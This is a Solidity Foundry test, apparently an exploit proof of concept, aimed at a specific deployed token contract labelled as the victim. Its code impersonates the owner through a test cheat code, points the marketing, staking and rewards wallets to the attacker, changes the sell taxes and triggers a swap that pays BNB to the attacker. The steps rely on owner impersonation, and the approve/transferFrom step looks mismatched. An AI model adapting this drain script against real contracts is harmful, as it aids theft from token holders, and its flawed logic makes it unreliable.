pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Honey {
    function owner() external view returns (address);
    function marketingWallet() external view returns (address);
    function StakingPool() external view returns (address);
    function DappRewardsPool() external view returns (address);
    function updateMarketingWallet(address) external;
    function updateStakingPool(address) external;
    function updateDappRewardsPool(address) external;
    function setSellTaxes(uint256, uint256, uint256, uint256, uint256) external;
    function setTradingStatus() external;
    function swapTokensAtAmount() external view returns (uint256);
    function pair() external view returns (address);
    function transfer(address, uint256) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker = address(this);
    Honey target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Honey(TARGET);
        vm.label(TARGET, "3-honey Victim Contract");
        vm.label(attacker, "Attacker");
        vm.label(target.marketingWallet(), "Original Marketing");
        vm.label(target.StakingPool(), "Original Staking");
        vm.label(target.DappRewardsPool(), "Original Dapp");
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker balance
        uint256 initialBalance = attacker.balance;

        // Step 1: Impersonate owner
        address owner = target.owner();
        vm.startPrank(owner);

        // Step 2: Transfer tokens from owner to attacker
        uint256 tokenAmount = 1000000 * 1e5; // 1M tokens
        target.transfer(attacker, tokenAmount);

        // Step 3: Update wallet addresses to attacker
        target.updateMarketingWallet(attacker);
        target.updateStakingPool(attacker);
        target.updateDappRewardsPool(attacker);

        // Step 4: Set malicious tax configuration (liquidity=0, maximize others)
        target.setSellTaxes(0, 5, 0, 5, 5);

        // Step 5: Enable trading
        target.setTradingStatus();

        vm.stopPrank();

        // Step 6: Approve contract to spend attacker's tokens
        target.approve(address(target), tokenAmount);

        // Step 7: Transfer tokens to contract to accumulate balance >= swapTokensAtAmount
        uint256 tokensToContract = target.swapTokensAtAmount();
        target.transferFrom(attacker, address(target), tokensToContract);

        // Step 8: Trigger swapAndLiquify by transferring remaining tokens to pair
        uint256 remainingTokens = tokenAmount - tokensToContract;
        target.transfer(target.pair(), remainingTokens);

        // Step 9: Verify attacker received BNB
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received BNB from exploit");
    }

    receive() external payable {}
}

